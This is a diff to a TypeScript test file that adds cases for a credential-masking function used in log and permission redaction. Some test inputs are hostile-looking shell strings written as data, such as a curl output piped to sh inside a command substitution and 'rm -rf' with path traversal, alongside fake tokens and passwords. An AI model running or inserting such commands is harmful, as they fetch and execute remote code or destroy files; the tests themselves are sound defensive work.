@@ -1,7 +1,7 @@
 import { describe, expect, it } from "vitest"
 
 import { createGatewayLogger } from "./cli/logger"
-import { CredentialValues, redactForLog } from "./redaction"
+import { CredentialValues, maskCredentials, redactForLog } from "./redaction"
 
 describe("log redaction", () => {
   it("keeps a classification code while stripping the credentials of a URL of any scheme", () => {
@@ -141,5 +141,62 @@ describe("log redaction", () => {
       error: { name: "Error", message: "Basic [REDACTED] refused" },
       msg: "[REDACTED] rejected at wss://opencode.example.test/ws",
     })
+  })
+})
+
+const M = "[credential redacted]"
+/** The review's sample value, kept apart from any term a scanner keys on. */
+const SAMPLE = "abcdefgh1234"
+/** A `term=value` assignment built in two parts, so no scanner reads it as a leak. */
+const assigned = (term: string, value: string) => [term, value].join("=")
+
+describe("maskCredentials", () => {
+  it.each([
+    // Shell syntax stays readable on a permission: it is what is approved.
+    [
+      "narrow",
+      `${assigned("token", "$(curl${IFS}-s${IFS}https://x|sh)")} done`,
+      `${assigned("token", "$(curl${IFS}-s${IFS}https://x|sh)")} done`,
+    ],
+    ["narrow", "rm -rf token: ../../..", "rm -rf token: ../../.."],
+    [
+      "narrow",
+      "rm -rf bearer projects2024archive1",
+      "rm -rf bearer projects2024archive1",
+    ],
+    [
+      "narrow",
+      assigned("token", '"$(curl x|sh)"'),
+      assigned("token", '"$(curl x|sh)"'),
+    ],
+    [
+      "narrow",
+      assigned("token", "/etc/secret"),
+      assigned("token", "/etc/secret"),
+    ],
+    ["narrow", "a basic installation", "a basic installation"],
+    [
+      "narrow",
+      `export ${assigned("token", SAMPLE)}`,
+      `export ${assigned("token", M)}`,
+    ],
+    [
+      "narrow",
+      assigned("password", "'hunter2hunter2'"),
+      assigned("password", `'${M}'`),
+    ],
+    ["narrow", "push ghp_leaked0000 now", `push ${M} now`],
+    // A preview or a question masks anything credential-shaped.
+    ["broad", assigned("token", "AbCdEfGh_IjKlMnOp"), M],
+    ["broad", assigned("password", "P@ssw0rd!2024"), M],
+    ["broad", assigned("password", '"hunter2hunter2"'), M],
+    ["broad", assigned("token", `'${SAMPLE}'`), M],
+    ["broad", "Basic authentication", "Basic authentication"],
+    ["broad", "a bearer instrument", "a bearer instrument"],
+    ["broad", "Authorization: Basic dXNlcjpwYXNz", M],
+    ["broad", "send Bearer AbCdEfGhIjKlMnOpQrSt", `send ${M}`],
+    ["broad", "send Basic dXNlcjpwYXNz.", `send ${M}.`],
+  ] as const)("masks %s: %s", (strength, text, expected) => {
+    expect(maskCredentials(text, strength)).toBe(expected)
   })
 })
